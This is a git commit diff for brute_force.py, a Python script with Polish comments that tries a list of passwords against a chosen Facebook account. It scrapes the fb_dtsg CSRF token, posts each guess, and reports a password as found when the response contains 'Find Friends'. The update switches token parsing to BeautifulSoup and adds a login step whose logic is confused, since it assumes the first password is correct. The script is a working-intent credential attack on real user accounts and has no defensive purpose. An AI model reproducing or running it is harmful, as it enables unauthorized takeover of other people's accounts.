f6e7e2df0997052c3487e394af65e38b65204446
Kamil01 <107310243+Adminek01@users.noreply.github.com>
2023-11-21 18:49:40 +0100

    Update brute_force.py

--- brute_force.py
+++ brute_force.py
@@ -1,35 +1,40 @@
-
-
 import requests
-import re
+from bs4 import BeautifulSoup
 
 def get_csrf_token(session):
     response = session.get("https://www.facebook.com/")
-    match = re.search(r'name="fb_dtsg" value="([^"]+)"', response.text)
-    if match:
-        return match.group(1)
-    else:
-        print("Nie udało się uzyskać tokenu CSRF.")
-        return None
+    soup = BeautifulSoup(response.text, "html.parser")
+    csrf_token = soup.find("input", {"name": "fb_dtsg"})["value"]
+    return csrf_token
 
 def brute_force(email, fb_id, passwords):
     with requests.Session() as session:
-        csrf_token = get_csrf_token(session)
-        if csrf_token:
-            for password in passwords:
-                data = {
-                    "email": email,
-                    "pass": password,
-                    "fb_dtsg": csrf_token,
-                    "login": "Zaloguj się"
-                }
+        # Logowanie do Facebooka
+        login_data = {
+            "email": email,
+            "pass": passwords[0],  # Zakładamy, że pierwsze hasło jest poprawne
+            "login": "Zaloguj się"
+        }
+        session.post("https://www.facebook.com/login.php", data=login_data)
 
-                response = session.post(f"https://www.facebook.com/{fb_id}", data=data)
-                if "Find Friends" in response.text:
-                    print(f"Hasło znalezione: {password}")
-                    break
-                else:
-                    print(f"Błędne hasło: {password}")
+        # Pobieranie tokenu CSRF
+        csrf_token = get_csrf_token(session)
+
+        # Próba złamania hasła
+        for password in passwords:
+            data = {
+                "email": email,
+                "pass": password,
+                "fb_dtsg": csrf_token,
+                "login": "Zaloguj się"
+            }
+
+            response = session.post(f"https://www.facebook.com/{fb_id}", data=data)
+            if "Find Friends" in response.text:
+                print(f"Hasło znalezione: {password}")
+                break
+            else:
+                print(f"Błędne hasło: {password}")
 
 if __name__ == "__main__":
     email = input("Podaj adres e-mail (jako nazwę użytkownika): ")
